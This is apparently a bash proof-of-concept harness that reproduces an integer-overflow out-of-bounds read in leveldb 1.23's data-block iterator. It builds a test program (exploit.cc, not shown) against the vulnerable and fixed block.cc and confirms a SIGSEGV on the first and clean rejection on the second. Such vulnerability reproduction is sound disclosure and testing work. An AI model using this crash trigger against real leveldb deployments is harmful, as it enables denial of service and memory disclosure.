#!/usr/bin/env bash
# LeveldbOverrun — leveldb 1.23 data-block iterator integer-overflow -> OOB read.
#
# Builds the REAL leveldb 1.23 `table/block.cc` (vendored, verbatim) into a tiny
# harness that drives Block::Iter against a crafted corrupt block placed at the
# end of a page with a PROT_NONE guard page after it. Then builds the same harness
# against the FIXED block.cc (upstream commit 2946558, byte-identical to master)
# and runs the differential.
#
#   vulnerable (1.23) : iter->Valid()==true, value().size()==0xffffffff, then the
#                       forced read walks off the page -> SIGSEGV (exit 139).
#   fixed (2946558)   : iter->Valid()==false, status="Corruption: bad entry in
#                       block" -> no out-of-bounds read (exit 0).
#
# exit 0 = OOB read reproduced on the vulnerable build AND cleanly rejected on the
#          fixed build (differential proof). Any other outcome -> non-zero.
set -u
cd "$(dirname "$0")"

ZIG="${ZIG:-/home/millie/tools/toolchain/zig-linux-x86_64-0.14.0/zig}"
if [ ! -x "$ZIG" ]; then
  ZIG="$(command -v zig || true)"
fi
if [ -z "$ZIG" ] || ! "$ZIG" version >/dev/null 2>&1; then
  echo "zig toolchain not found (set ZIG=/path/to/zig)"; exit 2
fi

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

SRC=vendor/leveldb-1.23
CXXFLAGS=(-std=c++11 -O1 -I"$SRC" -I"$SRC/include" -pthread)
COMMON_SRCS=(
  "$SRC/table/iterator.cc" "$SRC/util/coding.cc" "$SRC/util/comparator.cc"
  "$SRC/util/status.cc" "$SRC/util/logging.cc"
)

echo "=== [1/4] build harness against VULNERABLE leveldb 1.23 table/block.cc ==="
timeout 180 "$ZIG" c++ "${CXXFLAGS[@]}" exploit.cc "$SRC/table/block.cc" "${COMMON_SRCS[@]}" \
  -o "$WORK/vuln" || { echo "vulnerable build failed"; exit 2; }

echo "=== [2/4] build harness against FIXED block.cc (upstream 2946558) ==="
timeout 180 "$ZIG" c++ "${CXXFLAGS[@]}" exploit.cc vendor/block_fixed.cc "${COMMON_SRCS[@]}" \
  -o "$WORK/fixed" || { echo "fixed build failed"; exit 2; }

echo
echo "=== [3/4] VULNERABLE build (expect: Valid==true, 0xffffffff value, SIGSEGV) ==="
"$WORK/vuln" 2>&1
VRC=$?
echo "    [vulnerable exit code: $VRC  (139 == SIGSEGV, the OOB read)]"

echo
echo "=== [4/4] FIXED build (expect: corruption detected, clean exit 0) ==="
"$WORK/fixed" 2>&1
FRC=$?
echo "    [fixed exit code: $FRC  (0 == corruption rejected cleanly)]"

echo
VULN_OK=0
if [ "$VRC" -eq 139 ]; then VULN_OK=1; fi
if [ "$FRC" -eq 0 ]; then FIXED_OK=1; else FIXED_OK=0; fi

if [ "$VULN_OK" = "1" ] && [ "$FIXED_OK" = "1" ]; then
  echo "LEVELDBOVERRUN-OK: vulnerable build hands out a 0xffffffff-byte value() Slice"
  echo "  past a 16-byte block and SIGSEGVs on the read (OOB-READ-CONFIRMED), while the"
  echo "  fixed build rejects the same block with Status::Corruption and does not read OOB."
  exit 0
else
  echo "LEVELDBOVERRUN-FAIL: vuln_exit=$VRC fixed_exit=$FRC (expected 139 / 0)"
  exit 1
fi
